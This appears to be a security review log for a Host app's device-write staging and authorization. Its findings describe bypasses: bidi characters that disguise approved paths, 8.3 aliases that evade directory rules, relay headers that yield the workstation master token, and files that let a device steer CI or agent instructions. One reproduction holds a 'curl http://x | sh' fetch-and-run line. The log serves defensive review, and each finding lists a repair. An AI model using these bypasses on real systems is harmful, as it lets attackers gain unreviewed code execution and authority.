method: Each round: independent reviewer agents (one per lens) that did not write the change, with probes run in a scratch folder; every MEDIUM+ finding then went to two independent skeptic agents prompted to refute it. Confirmed = at least half the skeptics did not refute. Confirmed findings were repaired with a regression test before the next round, and each later round re-reviewed the earlier repairs.

findings.finding: Mid-run hold fails open when a launcher's intermediate process exits before the tree sampler sees it
findings.reproduction: Probe scratchpad/review-probes/survivor-probe.mts case B: root 600 has ended; intermediate 601 exited before any tree sample; grandchild 602 (ppid 601, createdAt 30) is alive in the process table. Call TaskManager.prototype.watchSurvivors with rootPid 600 and an empty processTree snapshot. After the first check, lingering is empty, so liveCodeExecutions() reports nothing and remoteMutationHeld() returns null while 602 runs. Control case C (601 present in the snapshot) keeps 602 tracked.
findings.boundary: Workstation-approved code still running (survivor of an ended attempt) must keep a paired-device write held; survivor lineage is built only from the 15 s process-tree snapshot plus the root PID.
findings.repair: Not repaired in F02 (Host process-tracking change outside the authorization-edge scope). Impact reduced: under D2 device writes never land while code runs; they are staged, and promotion is a workstation decision that refuses while liveCodeExecutions() reports code. See previous-review-findings.md.

Files under .augment/ and .trae/ are correctly AGENT_INSTRUCTIONS.

findings.finding: Promotion review shows destination with unescaped bidi and zero-width characters, so the reviewer can be shown a different filename
findings.reproduction: A paired device calls filesystem.write with path 'docs/invoice‮gnp.md' (U+202E right-to-left override). classifyDeviceWrite returns PHONE_SAFE_DOCUMENT (the leaf ends in .md). promotionReason() renders Destination via JSON.stringify(record.destination), which leaves U+202E raw, so the Host review displays the name with the override applied, not the bytes-on-disk name. Zero-width characters (U+200B, U+FEFF) in a destination or in preview content are also left raw.
findings.boundary: Workstation promotion review text (what the Windows Host approver reads) versus the actual destination written by writePromoted. The reviewer's approval must bind to the real path.
findings.repair: Invisible/format characters in a path classify UNKNOWN (never staged); review text escapes via escapedText()

findings.finding: Staged device writes skip the private Host state refusal, so a device can stage and then promote entries into Host logs or private state
findings.reproduction: Probe: privateHostPath(dataDir, '<dataDir>/logs/audit-note.log') is true, but remoteExecutionRefusal('filesystem.write', {path:'AppData/Local/Bunny-A/development/logs/audit-note.log', content:'...'}, 'WRITE', 'C:/Users/allam') returns null and classifyDeviceWrite gives PHONE_SAFE_DATA (the 'logs' folder is treated as a data folder). Under a remote envelope the write is staged; the workstation's promotion request names it as a data file; promoteStaged re-checks only the write root, the reclassification and the destination state, then writePromoted places the bytes in the Host private logs folder. For a non-remote (workstation) envelope the same path skips classification entirely, so an approved .sqlite or credentials.json destination could also be overwritten after approval.
findings.boundary: E48 invariant (private Host state is never a Mission resource under any envelope). The adapter enforces it for direct filesystem.write, but the staged path returns before the adapter and promotion does not check it. Affects a device-attributed write whose destination lies inside an approved root that also contains the Host data directory (for example a broad home-folder root; default data dir is %LOCALAPPDATA%\Bunny-A\development).
findings.repair: stageRemoteWrite refuses privateHostPath destinations; promotion re-checks; local.server privateScope covers every Mission

findings.finding: Skill steps treat a staged write as success: the skill completes and validates with no promotion request and no applied change
findings.reproduction: Workstation-authored skill with a filesystem.write step runs inside a Mission in which a paired device has answered an earlier request (remoteActorFor 'answered' attribution, mission-wide). skills.run calls bus.request with the Mission's missionId, so stageRemoteWrite returns {ok:true, status:'succeeded', output:{staged:true, stagingId}}. skills.run treats run.status==='succeeded' as success and passes validations (status-based). The manager's skill branch sets result.ok = run.ok, and no askPromotion is raised. The step completes; the staged record stays STAGED until a Retry or Stop withdraws it. The project was not changed, but the Mission reports a successful write that never reached the workstation for review.
findings.boundary: Staging contract: a step must never complete or verify on the strength of the staging write. Only the capability executor reads the staged flag; the skill executor does not.
findings.repair: Only a step's own capability write executor can be staged; staged writes from skills or checks are refused

findings.finding: Classification role is judged relative to the step's cwd for admission and staging, but relative to the project root at promotion
findings.disposition: Both checks must pass (promotion re-classifies against the project root); a mismatch can only refuse more, never less

findings.finding: One-time device answer outlives a workstation-granted envelope's expiry
findings.reproduction: Run node --experimental-strip-types C:/Users/allam/AppData/Local/Temp/claude/C--Users-allam-Documents-new-bun-router/133abb7b-876a-4654-a1f2-ee186fd14586/scratchpad/review-probes/p1-expiry.ts. Envelope grantedBy workstation, expiresAt 60 s in the past, no revocation. Without a one-time answer decide() returns ask 'The mission authorization expired.'; with oneTime:true it returns allow. In the product: a device answers a filesystem.write ask at T-1 min (deviceRequestRefusal checks expiry only at answer time, manager.server.ts:2103). liveOnce/onceInvalidity (manager.server.ts:2454-2466) checks device liveness, the 5 min TTL and Agent revision only, never envelope expiry. capabilityRequest sets oneTimeAction (manager.server.ts:1564), bus.decision sets oneTime (bus.server.ts:185), and decide() returns allow at authorization.server.ts:392, before the non-remote expiry check at :400. The remote-only expiry check at :391 does not cover workstation envelopes. Result: a step can execute after its Mission authority ended, for up to DEVICE_ANSWER_TTL_MS. This contradicts the comment at manager.server.ts:2101 ('A device never extends an expired or revoked envelope, for any action').
findings.boundary: D3 one-time scope: Host policy / Mission envelope lifetime vs. device one-time allowance (workstation-granted, device-answerable Missions; not Agent Missions, which are covered by agenticIdentityViolation)
findings.repair: onceInvalidity() checks envelope expiry/revocation, device liveness, TTL, Agent revision and Host generation; liveOnce() drops the answer (EXPIRED)

findings.finding: Device-driven workstation-envelope Missions keep staging device-attributed writes after sign-out, and those staged changes stay promotable
findings.reproduction: 1) Device D approves a Mission whose envelope is workstation-granted (or D answers a workstation-envelope ask, or D started it: markDeviceDriven sets mission.deviceDriven = device:D). 2) D calls device.revoke {} (self sign-out). 3) endDeviceGrants (http.server.ts:837-900) ends D's unused answers, STAGED records, batches, consents and remote envelopes, but calls endDeviceDriven only when cause === 'revocation' (http.server.ts:896), so the workstation-envelope Mission keeps running. 4) The Mission's next filesystem.write goes through bus.server.ts:320-325 to stageRemoteWrite. remoteActorFor (manager.server.ts:2373-2387) returns device:D from deviceDriven with no liveness check, and stageRemoteWrite (manager.server.ts:2483-2490) has no liveness check, so a new STAGED record with deviceId device:D is created after invalidateDeviceStaging already ran. 5) askPromotion raises a desktopRequired promotion request. 6) The workstation allows it. promoteStaged checks deviceActive only when staged.envelopeRemote (manager.server.ts:2613), which is false here, so the write lands in the project. Workstation-revocation is not affected because endDeviceDriven stops the Mission.
findings.boundary: Revoked/signed-out device authority: a self sign-out must leave no path that makes the signed-out device's changes promotable. Attribution is by remoteActorFor (deviceDriven marker), not by live authority. The liveness check in promoteStaged covers only remote envelopes.
findings.repair: — (refuted). Sign-out invalidates the device's staged changes via invalidateDeviceStaging (INVALIDATED_BY_SIGNOUT), and promotion refuses non-STAGED records

findings.finding: Device expiry is not treated as revocation: deviceActive ignores the idle bound and device-approved Agent consents have no admission liveness check
findings.disposition: deviceActive applies DEVICE_SESSION_MS and expiry; device answers are re-validated at admission by liveOnce

findings.finding: A write admitted before Stop can be staged after Stop, leaving an orphan STAGED record in a stopped Mission
findings.disposition: Stop withdraws staged changes (WITHDRAWN); a late stage on a stopped Mission is withdrawn and never promotable

findings.finding: authorizeBridge treats loopback-peer requests as workstation unless a hard-coded header list matches; unlisted relay headers grant the workstation token
findings.reproduction: A loopback-peer reverse proxy rewrites Host to 127.0.0.1:<port> or localhost and forwards a remote request with no cookie and no header in PROXY_HEADERS/RELAY_PREFIX (e.g. x-request-id, x-nginx-proxy). authorizeBridge returns {local:true,token:null}; hostCall then sends the workstation credentials token. Probe run: node --experimental-strip-types scratchpad/review-probes/d4-bridge-probe.mts -> 'relay adds unlisted header x-request-id => {"local":true,"token":null}' and 'x-nginx-proxy' same, while x-forwarded-for is refused. Current configured tunnel is cloudflared quick/named tunnel which adds cf-* headers, so exposure today depends on a non-cloudflared or misconfigured relay.
findings.boundary: Remote (unpaired or paired) client reaching the Host via a loopback relay/proxy -> workstation (local:true) authority, which yields the Host master token in hostCall and full workstation actor.
findings.repair: host-bridge LOCAL_X_HEADER allow-list: any other x-* header (and Forwarded/Via etc.) means relayed, never local

skepticVotes.severityIfReal: HIGH if a loopback relay that adds no listed or prefixed header is exposed (the bypass grants the Host master token and full workstation actor); MEDIUM as currently deployed, because the documented cloudflared tunnel adds cf-* headers and is refused.

findings.finding: mutationSequence is not monotonic: a promotion that fails after the rename restores the count, so pre-promotion grants validate again and the unrecorded project change is invisible to the code gates
findings.reproduction: 1) Device write is staged (its filesystem.write capability run is inserted, count=1). 2) Workstation mints a terminal.exec grant at count=1. 3) Workstation promotes: STAGED->PROMOTING (count=2, grant void), writePromoted renames the phone bytes into the project, then the read-back readFileSync inside writePromoted throws (for example a Windows AV/indexer lock, EBUSY/EPERM). 4) The catch in promoteStaged transitions PROMOTING->FAILED, so the device_staging count drops to 0 and the total returns to 1. 5) The grant from step 2 passes desktopGrantViolation again, and the project file holds the unreviewed phone bytes. No remote_changes row is written on this path (recordRemoteChange only runs after success), so pendingRemoteReview(), the session gate and the code-run gate see nothing to review.
findings.boundary: Trusted-desktop grant binding (mutationSequence) for staged-change promotion. Crosses store.server.ts mutationSequence, staging.server.ts writePromoted, and manager.server.ts promoteStaged.
findings.repair: mutationSequence counts staging rows that are PROMOTING/PROMOTED or ever had promotionStarted=1; a failed promotion records an unreviewed remote change

findings.finding: Every device-attributed staged write voids all outstanding workstation grants (fail-closed; forces re-approval, no boundary break)
findings.disposition: Intended: any device-originated mutation advances the sequence

findings.finding: Promotion review text does not escape several invisible bidi/format characters (U+200E, U+200F, U+061C, U+200B-U+200D, U+FEFF, U+2060), so the workstation can be shown a reordered review of the exact bytes
findings.reproduction: Stage content 'ok ‏‎؜​﻿⁠ end' through a remote write. escapedText() returns the string with those code points unescaped; only ‪-‮, ⁦-⁩,  ,   and • are escaped. The promotion request reason (full content JSON) therefore shows raw RLM/LRM/ALM/ZWSP/BOM/word-joiner characters that can reorder or hide adjacent text in the Windows Host UI, while the approved bytes are the same. Probe: scratchpad/review-probes/r2/probe1.mts prints the escaped output with code points 200f 200e 200b feff 2060 still present.

findings.finding: Device answer already in use is stamped INVALIDATED_* on revocation and never CONSUMED
findings.reproduction: 1) Paired device answers an ask for step S (respond allow_once sets approvedOnce on S, manager.server.ts ~4150). 2) S is admitted: markRunning (keeps approvedOnce) sets state running, and capabilityRequest/liveOnce passes (manager.server.ts ~1547). The capability executes. 3) Device is revoked or signs out (http.server.ts:842 calls endDeviceAnswers). endDeviceAnswers (manager.server.ts:2427-2441) only skips terminal steps, so it clears approvedOnce on the running step (saveStep at ~2435) and then stamps the request INVALIDATED_BY_DEVICE_REVOCATION / INVALIDATED_BY_SIGNOUT with emit approval.device_revoked saying the answer 'no longer applies'. 4) S completes; verifyAndComplete (manager.server.ts ~3568) stamps CONSUMED only if step.approvedOnce is still set, so it never is. Result: a used answer is recorded as never used, and the stamp is not derivable as consumed.
findings.boundary: Audit integrity of paired-device one-time answers (brief 12/13): an answer that has already authorized an admission must read as used, not as invalidated.
findings.repair: CONSUMED is stamped at admission (bus.onceAdmitted); first stamp wins, so revocation never relabels a used answer

findings.finding: Failed, retried, replanned and stopped steps end one-time answers without a terminal lifecycle
findings.reproduction: a) Device or workstation answers allow_once for step S; S runs and fails at verification (stepFailed, manager.server.ts:3681 clears approvedOnce with no stamp). b) Retry on a failed or retrying step clears approvedOnce without a stamp (3666, 4296; Replan 4305 loops every non-completed step). c) Mission Stop sets steps to 'stopped' (4227, 4252) and never clears approvedOnce, and endDeviceAnswers skips stopped steps (2429), so the answer remains on a terminal step and is never stamped even after device revocation. In all cases the request keeps resolution allow_once with lifecycle undefined, which reads as a permanently live APPROVED answer.
findings.boundary: Every invalidation needs safe audit provenance and every answered request must be derivable to a terminal state (CONSUMED, EXPIRED, INVALIDATED_BY_*) or remain live.
findings.repair: setStep stamps WITHDRAWN when approvedOnce is cleared/replaced; failure paths and recover() stamp; Stop clears approvedOnce

findings.finding: Promotion that fails after its write leaves the promotion request open and the step waiting with no exit except deny or Stop
findings.reproduction: 1) A device-attributed write is staged; the step waits on a filesystem.promote request with pendingRequestId set. 2) Workstation allow_once: promoteStaged renames the bytes into place, then the read-back differs (or writePromoted throws after the rename). 3) The code calls promotionFailed (record becomes FAILED, unreviewed remote change recorded) and throws CommandRefusedError. It does NOT call end(), so the request stays unresolved (no resolvedAt, no lifecycle) and the step stays waiting_for_approval with pendingRequestId still set. 4) Any further allow_once hits the guard at line 2611 ('this staged change is FAILED') and throws again. The only ways out are deny (respond deny path) or Stop. The request is never stamped or closed by Host logic.
findings.boundary: State machine: after a promotion that may have touched the project, the request must end (or the step must fail), and a later answer must not be silently refused forever.
findings.repair: promotionFailed() + closeWaiting(): FAILED staging, unreviewed remote change, request closed, step failed

findings.finding: 8.3 directory alias bypasses the dot-folder, agent, execution and watched-source directory rules
findings.reproduction: Project contains scripts/run.md, .qwen/c.md, .warp/w.md and .trae/r.md; the 8.3 aliases SCRIPT~1, QWEN~1, WARP~1 and TRAE~1 exist on disk and resolve to the same files. Probe run with node --experimental-strip-types from the repo root (probe files under scratchpad/review-probes/r3/): classifyDeviceWrite('scripts/run.md') returns EXECUTION_RELEVANT, but classifyDeviceWrite('SCRIPT~1/run.md') returns PHONE_SAFE_DOCUMENT ('plain document'). classifyDeviceWrite('.qwen/c.md') returns AGENT_INSTRUCTIONS, but 'QWEN~1/c.md' and 'WARP~1/w.md' and 'TRAE~1/r.md' return PHONE_SAFE_DOCUMENT. GITHUB~1, VSCODE~1 and CLAUDE~1 are refused only because names.segments happens to cover them. Only names.segments is checked for node_modules, .husky, .githooks and EXECUTION_CONFIG_DIR, so scripts, hooks, bin, src and agent folders lack the same coverage.
findings.boundary: D1 classifyDeviceWrite (authorization.server.ts). Directory role regexes at lines 602, 605, 606 and 612 are tested only against `dirs`, the segments of the canonical relative path. Canonicalization keeps 8.3 short names, so a directory written as a short alias is never matched. The `~\d` refusal at line 573 covers only the leaf, not directory components. The round-2 repair (every dot-folder is CONFIGURATION) and the EXECUTION_DIR rule are both defeated. A remote-envelope device write to an alias is therefore PHONE_SAFE, passes remoteExecutionRefusal, and reaches the workstation promotion prompt labelled PHONE_SAFE_DOCUMENT. The workstation still has to approve it, so this is a classification and reviewer-label gap rather than a direct bypass.
findings.repair: Any 8.3 (~digit) component below the step folder classifies UNKNOWN

findings.finding: Lifecycle of an answer that was already used is stamped WITHDRAWN, not CONSUMED, after a verify-phase ask or a step failure
findings.reproduction: Code-path reproduction, not executed: a write step is answered allow_once and admitted (filesystem.write runs). Its verification check then needs an ask (verifyAndComplete -> askPermission phase verify, step waiting_for_approval with approvedOnce still set). The workstation answers allow on the verify request, which runs setStep(approvedOnce: {verify request}) at manager.server.ts ~4144-4147. The execution answer's request gets lifecycle WITHDRAWN (setStep at line 510-511) and never CONSUMED. The same WITHDRAWN stamp results when verification fails and stepFailed clears approvedOnce (~3703).
findings.boundary: Audit integrity of the one-time-answer lifecycle (F02 section 12). CONSUMED is stamped only at step completion (manager.server.ts:3590) and in endDeviceAnswers (2444). The execution answer stays on the step (approvedOnce is not cleared at admission) while the step runs its verification, and askPermission (~3789-3870) does not clear it either. A verify-phase ask or a later failure therefore runs setStep with approvedOnce replaced or null, and setStep stamps WITHDRAWN on the already-exercised answer: 'The step ... ended this one-time answer'. The WITHDRAWN record is permanent (first stamp wins), so the audit trail says a write that actually executed was withdrawn unused.
findings.repair: CONSUMED at admission (first stamp wins) precedes any later WITHDRAWN

findings.finding: endDeviceAnswers records CONSUMED for answers that were never exercised on running or verifying steps
findings.disposition: endDeviceAnswers stamps INVALIDATED_*; CONSUMED only from admission

findings.finding: Retry strands a waiting promotion step and withdraws the staged change before validating Retry
findings.reproduction: 1) A paired device with a remote envelope stages a write; askPromotion (~3319) leaves the step in waiting_for_approval with pendingRequestId = the promotion request and the mission drops to waiting_for_user (tick, ~line 999-1006). 2) The workstation clicks Retry. retry() calls withdrawStaged (4298) -> endStaged marks the record WITHDRAWN and saves the request as resolved 'deny' and resolves its inbox item, but the step stays waiting_for_approval with a pendingRequestId that now points at a closed request. 3a) If the mission has no failed step, retry throws 'No failed step to retry.' (4309) AFTER the staged change was already withdrawn: the refused Retry still destroys the pending change. 3b) If a failed step exists, retry re-arms it and the mission runs, but tick() finds no progressing step and only a waiting one, so it sets waiting_for_user again. 4) respond() rejects any answer with 'This request was already answered.' (3984), so the only remaining exits are Stop or Replan. invalidateDeviceStaging (2582-2593) handles the same state correctly by failing the step; withdrawStaged does not.
findings.boundary: Mission state/step lifecycle: manager.server.ts withdrawStaged (2597) and endStaged (2570-2586) close the promotion request but never move its step; retry() (4291) calls withdrawStaged at 4298 before its own validation (no-failed-step throw at 4309, envelope check before it).
findings.repair: Retry validates the envelope first, fails promotion-waiting steps, withdraws, then re-stages

findings.finding: Full-content staged inspection shows unescaped text, so bidi and invisible characters can reorder what the workstation reviews
findings.reproduction: Stage a paired-device change larger than 8192 bytes whose content contains U+202E (RLO), U+2066-U+2069 or U+200B/U+FEFF in the first lines. promotionReason escapes these as ‮ etc. (escapedText, staging.server.ts:180-183), so the request preview is safe. The workstation then clicks 'Inspect all N bytes', which calls mission.staging.inspect; the Host returns the raw string, and the UI renders it in a <pre>. The full view can therefore show text that reads differently from the bytes that will be promoted, and the reviewer's approval is recorded against that view (recordInspection). The sha256 line does not reveal the reordering.
findings.boundary: Review integrity between the preview (escaped) and the full inspection (raw). inspectStaged returns bytes.toString('utf8') without escapedText, and the UI renders that string directly in a <pre>.
findings.repair: inspectStaged returns escapedText(bytes); sha256 of the raw bytes is shown alongside

findings.finding: Staged-change queries scan the whole table on every call and the table is never pruned
findings.disposition: Bounded by the device write rate and STAGING_MAX_BYTES; pruning is a future maintenance item

findings.finding: Client classifies the inspect command as mutating, so a reconciled or replayed inspect silently returns nothing
findings.disposition: mission.staging.list/inspect added to the client READ_ACTIONS (connection-model.ts)

findings.finding: 8.3 short alias of a dot agent folder is not recognized as an agent-instruction folder
findings.reproduction: Project root with an existing .opencode folder (Windows 8.3 alias OPENCO~1 generated; verified with dir /x on this volume). Call classifyDeviceWrite('OPENCO~1/command/x.md', {base: root, operation:'write', content:'# cmd'}) -> PHONE_SAFE_DOCUMENT ('plain document'). The same write as '.opencode/command/x.md' -> AGENT_INSTRUCTIONS. Under a remote envelope the bus does not refuse the alias write (remoteExecutionRefusal returns null), so the device may answer the ask and the change is staged; promotion re-check (manager.server.ts:2661) also passes because it is PHONE_SAFE. Workstation promotion still has to approve the bytes. Control: KIRO~1/steering/x.md -> CONFIGURATION (because .kiro is in EXECUTION_CONFIG_DIR), so the gap is specific to folders outside that list.
findings.boundary: Device write classifier (classifyDeviceWrite) directory-role checks use only the lexical/canonical segments, while the 8.3 alias expansion (names.segments) is consulted only for EXECUTION_CONFIG_DIR. Agent folders such as .opencode, .codebuddy, .grok are not in EXECUTION_CONFIG_DIR, so their 8.3 alias (OPENCO~1) escapes AGENT_INSTRUCTION_DIR. Affects the D1 class gate for paired-device writes under a remote envelope, and the promotion-time PHONE_SAFE re-check that relies on the same classifier.
findings.repair: Same as the 8.3 repair above (UNKNOWN)

findings.finding: Manifest mention check is case-sensitive on a case-insensitive filesystem
findings.reproduction: package.json contains scripts.sync = 'node -e 0 data/config.json'. classifyDeviceWrite('data/config.json', ...) -> EXECUTION_RELEVANT (control). classifyDeviceWrite('DATA/config.json', ...) or 'Data/Config.json' -> PHONE_SAFE_DATA ('JSON or YAML inside a recognized data or document folder'). The write lands on the same file that package.json executes against.
findings.boundary: mentionedByManifests (authorization.server.ts:546-552) decides whether a project manifest or workflow names a data path by String.includes on the exact spelling of the write path. NTFS is case-insensitive, so the planner can write the same file under a different spelling and the mention is not found. This defeats the documented invariant that a file a package.json names is EXECUTION_RELEVANT.
findings.repair: Manifest text and needle are lowercased with separators normalized to '/'

findings.finding: Data and document files consumed by existing project scripts are not scanned; a phone-safe text file can drive commands
findings.reproduction: Project has scripts/sync.js containing: readFileSync('data/cmds.txt','utf8') then execSync of its contents (or eval). classifyDeviceWrite('data/cmds.txt', {content:'curl http://x | sh'}) -> PHONE_SAFE_DOCUMENT ('plain document'), with no reason referencing scripts/sync.js. Under a remote envelope the write is not refused, it is staged, and the workstation promotion check (manager.server.ts:2661) only re-runs the same classifier. The only human control is the workstation's reading of the warning 'Programs may read this data file'.
findings.boundary: The classifier treats .txt/.md/.csv/.json inside data or doc folders as PHONE_SAFE and only scans PROJECT_MANIFESTS and .github/workflows for consumers (authorization.server.ts:533, :546-560). Project source under scripts/ or src/ that reads a data file and executes it (exec, eval, a YAML unsafe load) is not seen, so the phone-approved write of the data file is classified as inert. The path is a plan-authored write to data/cmds.txt followed by a normal npm run sync.
findings.repair: — (refuted as an authority issue). Documented: PHONE_SAFE_DATA is an inertness claim for the data folder itself; arbitrary project code may read promoted files. The change is staged and needs the owner's promotion with a 'Programs may read this data file' warning; running such a script needs workstation code-execution authority.

findings.finding: Startup-only program heuristic lets MDX/notebook-style code in a .md file pass as a plain document
findings.reproduction:
classifyDeviceWrite('docs/intro.md', {content:'# Intro

export const v = 1
'}) -> PHONE_SAFE_DOCUMENT ('plain document'). Control: content beginning 'export const v = 1' -> EXECUTION_RELEVANT ('new content starts like a program or script'). So the heuristic only catches program-first content.
findings.boundary: startsLikeProgram (authorization.server.ts:562-563) inspects only the first 64 characters after trimStart. A Markdown file under docs/ whose first line is a heading, followed by export or import statements, is classified PHONE_SAFE_DOCUMENT. In a project whose Markdown pipeline parses .md as MDX (for example Docusaurus with markdown.format 'mdx', which I did not verify against the installed version here), those statements are executed at build time.
findings.repair: Any line starting with import/export classifies EXECUTION_RELEVANT (conservative)

findings.finding: Retry withdraws staged change and fails waiting step before its attempt-ceiling check can refuse
findings.reproduction: Code-path trace, not executed. A device-attributed filesystem.write stages on a step whose attempt count is at the ceiling boundary. Retry admits a failed step with attempts.length <= 2*maxRetriesPerStep+1 (the check uses '>'). Running it adds an attempt via markRunning, so the step waits for promotion with attempts.length = 2*maxRetriesPerStep+2. The workstation then calls Retry on the failed mission. Line 4324 sets the waiting step to failed with detail 'the change is staged again for a fresh review'. Line 4325 withdraws its STAGED record and denies the open promotion request. The loop at 4331-4336 then throws 'reached its attempt ceiling; replan instead'. The mission stays failed.
findings.boundary: manager.server.ts retry(): the round-3 claim that Retry validates first holds only for the envelope check. The attempt-ceiling refusal runs after promotion-waiting steps are failed and their staged changes withdrawn.
findings.repair: retry() runs every refusal check (attempt ceiling over failed and promotion-waiting steps, no-failed-step) before failing waiting steps or withdrawing staged changes

skepticVotes.severityIfReal: MEDIUM (arguably LOW: no authority impact, but staged work is destroyed and the step reports a false retry message)

findings.finding: Classifier and review escaping miss variation selectors (Mn) in destination paths and content
findings.disposition: Variation selectors (U+FE00-FE0F, U+180B-180F, U+E0100-E01EF) refused in paths and escaped in review text

findings.finding: MDX-style ESM line check misses import and export forms without whitespace
findings.disposition: ESM check is /^[ 	]*(import|export) /m

findings.finding: Stop leaves one-time answers on already-failed steps unstamped
findings.disposition: stop() clears approvedOnce on failed steps (WITHDRAWN)

findings.finding: CONSUMED stamp does not end authority for later matching admissions within the same skill run
findings.disposition: A one-time answer covers one run of the step (MA0R 'Allow this skill run' contract); CONSUMED records the first admission. A re-run never reuses it (F02-R4-4).

findings.finding: Agent-instruction @-imports of docs files classify as PHONE_SAFE_DOCUMENT
findings.reproduction: Project root has CLAUDE.md containing the line '@docs/rules.md'. Remote envelope write (or overwrite:true on an existing docs/rules.md) of path 'docs/rules.md' with plain Markdown content. classifyDeviceWrite returns PHONE_SAFE_DOCUMENT ('plain document'), so deviceWriteClassRefusal allows it and the device write is staged with a phone-safe classification. Claude Code loads @-imported files from CLAUDE.md as agent instructions, so the device controls agent instructions.
findings.boundary: classifyDeviceWrite on a Markdown destination that a root agent-instruction file imports. Only PROJECT_MANIFESTS and .github/workflows are scanned for mentions; CLAUDE.md, AGENTS.md and similar root instruction files are never scanned.
findings.repair: consumerOf() scans agent instruction files (CLAUDE.md, AGENTS.md, ...) in the root and every ancestor folder; a referenced file is AGENT_INSTRUCTIONS

findings.finding: CI pipeline include of a YAML data file classifies as PHONE_SAFE_DATA
findings.reproduction: Root .gitlab-ci.yml contains 'include:\n  - local: docs/ci.yml'. A remote write (overwrite:true for an existing docs/ci.yml, or a new file) of 'docs/ci.yml' with 'stages: [x]' classifies PHONE_SAFE_DATA ('JSON or YAML inside a recognized data or document folder'). GitLab CI evaluates included local YAML job definitions, including script: entries, when the pipeline runs after push.
findings.boundary: classifyDeviceWrite on a YAML file inside a DATA_DIR folder (docs/) that a root CI config includes. .gitlab-ci.yml, Jenkinsfile, azure-pipelines.yml, buildspec.yml and similar are not in PROJECT_MANIFESTS.
findings.repair: consumerOf() scans CI pipeline roots (.gitlab-ci.yml, Jenkinsfile, azure-pipelines, bitbucket, buildspec, cloudbuild, ...) and root CI folders recursively; config-named structured data is CONFIGURATION anywhere

findings.finding: Manifest mention check misses ./ and // spellings, so referenced tool inputs classify as PHONE_SAFE
findings.reproduction: Root package.json has the script 'node tools/build.js --config docs/./cfg.json' (or 'docs//cfg2.json'). A remote write of 'docs/cfg.json' (or 'docs/cfg2.json') with '{}' classifies PHONE_SAFE_DATA, although the npm script reads it as the tool's configuration input. The inclusion check is a plain includes() on lowercased text with only backslash normalization.
findings.boundary: mentionedByManifests substring match: the needle comes from the normalized relative path, but the manifest text is not normalized for './', '//' or other equivalent spellings.
findings.repair: referenceText() normalizes case, separators, ./ and repeated separators in consumer text

findings.finding: Manifests over 256 KiB are silently skipped, so their references are not seen
findings.reproduction: Root package.json padded to about 300 KiB with a script that reads 'docs/bigcfg.json'. A remote write of 'docs/bigcfg.json' classifies PHONE_SAFE_DATA. The same file under 256 KiB classifies EXECUTION_RELEVANT.
findings.boundary: mentionedByManifests returns false for any manifest larger than MANIFEST_READ_LIMIT, so a fail-open skip hides every reference in that file.
findings.repair: An oversize (>1 MiB), unreadable or linked consumer fails closed (UNKNOWN)

skepticVotes.severityIfReal: LOW (reported MEDIUM): real fail-open, but the precondition is a pre-existing >256 KiB manifest and staged writes get Windows Host review. Sibling: the readFileSync catch at :553 is also fail-open.

findings.finding: Subdirectory package manifests and configs are never scanned
findings.reproduction: apps/web/package.json contains a script that reads 'data/sub.json' relative to apps/web. A remote write of 'apps/web/data/sub.json' classifies PHONE_SAFE_DATA, although a tool run from apps/web reads it as configuration.
findings.boundary: mentionedByManifests only reads manifests directly under the classification root. Monorepo packages keep their own package.json, tsconfig and tool configs in subfolders.
findings.repair: Consumers in every folder from the root down to the destination's folder are scanned; references match root-relative and consumer-relative

findings.finding: docs/_config.yml (Jekyll/GitHub Pages site config) classifies as PHONE_SAFE_DATA
findings.reproduction: Remote write of 'docs/_config.yml' with 'plugins_dir: ../scripts' (or 'plugins: [...]') classifies PHONE_SAFE_DATA. Jekyll and GitHub Pages read _config.yml in the source folder, so the content configures the build. The same file at project root correctly classifies CONFIGURATION.
findings.boundary: Structured data in a DATA_DIR folder is PHONE_SAFE_DATA. A Jekyll _config.yml in docs/ (the GitHub Pages /docs source) configures the site build: plugins, plugins_dir, exclude and safe settings.
findings.repair: CONFIG_LIKE_DATA names (incl. _config, mkdocs, hugo, pipeline, ...) and underscore site-generator folders are CONFIGURATION

findings.finding: Requirements files with a non-standard prefix classify as PHONE_SAFE_DOCUMENT
findings.reproduction: Remote write of 'dev-requirements.txt' with '-e ./tools' (or a '--index-url' line) classifies PHONE_SAFE_DOCUMENT. pip install -r reads it: '-e ./path' runs that package's setup.py during install, and '--index-url' redirects the package source. Whether a tool runs it depends on the project's CI or scripts, which the mention scan does not check for this file.
findings.boundary: CONSUMED_TEXT_FILE is anchored to a leading 'requirements' or 'constraints' prefix, so dev-requirements.txt, test-requirements.txt and similar pip input files pass as plain documents.
findings.repair: requirements/constraints anywhere in a .txt name and a requirements/ folder are CONFIGURATION; pip installer directives in content are EXECUTION_RELEVANT

findings.finding: Content ESM check only matches an ASCII space or tab after import/export
findings.disposition: Word-boundary ESM check

findings.finding: Skill-step one-time grant is reused by a re-run after allow_batch (CONSUMED grant revives)
findings.reproduction: 1) Mission with a skill step (e.g. steps: filesystem.write then terminal.exec). 2) Workstation allow_once on the filesystem.write ask: step.approvedOnce = W (action filesystem.write). 3) Skill run admits the write under oneTime; bus.onceAdmitted stamps W CONSUMED (capabilities/bus.server.ts:318) but does not clear step.approvedOnce. 4) The skill's terminal.exec step asks; askPermission (manager.server.ts ~3870-3880) sets waiting_for_approval without clearing approvedOnce. 5) Workstation answers allow_batch on the terminal.exec offer: respond() calls setStep(step,{state:'ready',pendingRequestId:null,pendingPhase:null}) (manager.server.ts ~4102-4106), which leaves approvedOnce = W. 6) runDeterministic's skill branch builds skills.run options with oneTimeAction: step.approvedOnce?.action (manager.server.ts ~1655) and never calls liveOnce (liveOnce is called only in capabilityRequest, manager.server.ts ~1560). 7) The re-run's filesystem.write is admitted via decide(oneTime) (bus.server.ts:187) with no approval, although W was already CONSUMED.
findings.boundary: Plain (non-Agent) Mission, workstation-answered one-time filesystem.write on a step whose executor is a skill. Device answers cannot reach this path (manager.server.ts:2135 refuses device answers on skill steps), so the trigger is workstation-only. Affects the one-time-grant invariant: at most one admitted execution per grant within the step's execution+verification scope.
findings.repair: The skill branch calls liveOnce(step) before every run, so a CONSUMED/WITHDRAWN/INVALIDATED answer is cleared and the write asks again

findings.finding: endDeviceAnswers reports already-consumed one-time answers as invalidated
findings.disposition: stampLifecycle is first-stamp-wins: a CONSUMED answer keeps CONSUMED; only the event count wording includes it (F02-R2-4 asserts the recorded state)

findings.finding: Consumer reference matching misses glob, quoted, and variable-indirected spellings (CI shell loops, pip globs)
